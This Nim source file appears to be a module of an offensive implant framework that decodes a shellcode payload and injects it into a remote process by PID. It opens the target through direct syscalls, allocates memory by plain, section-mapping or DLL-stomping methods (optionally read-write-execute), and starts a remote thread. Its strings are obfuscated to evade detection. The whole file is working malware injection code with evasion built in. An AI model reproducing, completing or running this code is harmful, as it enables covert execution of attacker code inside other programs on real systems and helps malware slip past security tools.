import ../../utils/global
import ../../utils/winapi/syscall
import ../execution/core
import modes
import utils

export decodePayload

proc injectPayload*(
  procH: pointer; payload: openArray[byte]; allocMode: string = ""; pid: uint32 = 0;
  stompDll: string = ""; rwx: bool = false
): pointer =
  # Allocates remote memory and starts a thread on the payload
  let mode =
    if allocMode.len == 0: obf("vanilla")
    else: allocMode
  let base = allocByMode(procH, payload, mode, pid, stompDll, rwx)
  if base == nil:
    return nil
  if base == nil:
    return nil
  createThreadEx(procH, base)

proc run_inj_shellcode*(input, params: string; buf: var openArray[char]): int =
  # Main function that injects shell code into a remote process
  let payload = decodePayload(input)
  if payload.len == 0:
    return writeErr(obf("invalid input"), buf)
  let pid = paramPid(params)
  if pid == 0:
    return writeErr(obf("missing pid"), buf)
  let allocMode = paramAllocMode(params)
  if allocMode.len == 0:
    return writeErr(
      obf("invalid alloc, use section, stomp, or omit alloc for vanilla"), buf
    )
  let procH = openTargetPid(pid)
  if procH == nil:
    return writeErr(obf("NtOpenProcess failed"), buf, lastOpenProcessStatus)
  let stompDll = if allocMode == obf("stomp"): paramStompDll(params) else: ""
  let rwx = paramRwx(params)
  let hThread = injectPayload(procH, payload, allocMode, pid, stompDll, rwx)
  if hThread == nil:
    discard ntCloseHandle(procH)
    var errMsg = errorText(obf("injection failed"))
    if allocMode == obf("stomp"):
      let stompMsg = takeStompErr()
      if stompMsg.len > 0:
        errMsg = stompMsg
    return writeMsg(errMsg, buf)
  discard ntCloseHandle(hThread)
  discard ntCloseHandle(procH)
  writeMsg(obf("Shellcode injected into pid ") & $pid & obf("."), buf)
